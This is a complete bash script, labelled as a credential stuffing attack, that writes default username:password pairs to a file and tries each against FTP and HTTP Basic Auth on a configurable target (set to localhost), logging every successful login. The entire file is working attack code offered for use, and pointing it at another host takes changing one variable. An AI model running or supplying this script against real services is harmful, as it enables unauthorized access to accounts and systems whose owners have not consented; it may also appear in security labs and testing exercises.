#!/bin/bash
# Credential Stuffing Script (Completed)
# Tests known username:password pairs

CREDS_FILE="creds.txt"
TARGET="127.0.0.1"
HTTP_PATH="/protected/"
FTP_SUCCESS_LOG="ftp_success.log"
HTTP_SUCCESS_LOG="http_success.log"

# Create sample credential pairs file
nano_creds() {
cat > "$CREDS_FILE" << EOF
admin:admin
admin:password
test:test
webuser:password
testuser1:password123
EOF
}

# Create credentials file if not exists
if [ ! -f "$CREDS_FILE" ]; then
    nano_creds
fi

# Function to test FTP credentials using curl
test_ftp_login() {
    local username=$1
    local password=$2
    local target=$3

    curl -s --user "$username:$password" "ftp://$target" > /dev/null 2>&1

    if [ $? -eq 0 ]; then
        return 0
    else
        return 1
    fi
}

# Function to test HTTP Basic Auth credentials
test_http_login() {
    local username=$1
    local password=$2
    local target=$3
    local path=$4

    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -u "$username:$password" "http://$target$path")

    if [ "$RESPONSE" == "200" ]; then
        return 0
    else
        return 1
    fi
}

TOTAL=0
FTP_SUCCESS=0
HTTP_SUCCESS=0

echo "Starting Credential Stuffing Attack..."
echo "======================================="

while IFS=: read -r username password; do
    TOTAL=$((TOTAL+1))

    echo "Testing $username:$password"

    # Test FTP
    test_ftp_login "$username" "$password" "$TARGET"
    if [ $? -eq 0 ]; then
        echo "[FTP SUCCESS] $username:$password" | tee -a "$FTP_SUCCESS_LOG"
        FTP_SUCCESS=$((FTP_SUCCESS+1))
    fi

    # Test HTTP
    test_http_login "$username" "$password" "$TARGET" "$HTTP_PATH"
    if [ $? -eq 0 ]; then
        echo "[HTTP SUCCESS] $username:$password" | tee -a "$HTTP_SUCCESS_LOG"
        HTTP_SUCCESS=$((HTTP_SUCCESS+1))
    fi

done < "$CREDS_FILE"

echo "======================================="
echo "Credential Stuffing Summary"
echo "Total Tested: $TOTAL"
echo "FTP Successful Logins: $FTP_SUCCESS"
echo "HTTP Successful Logins: $HTTP_SUCCESS"
echo "======================================="
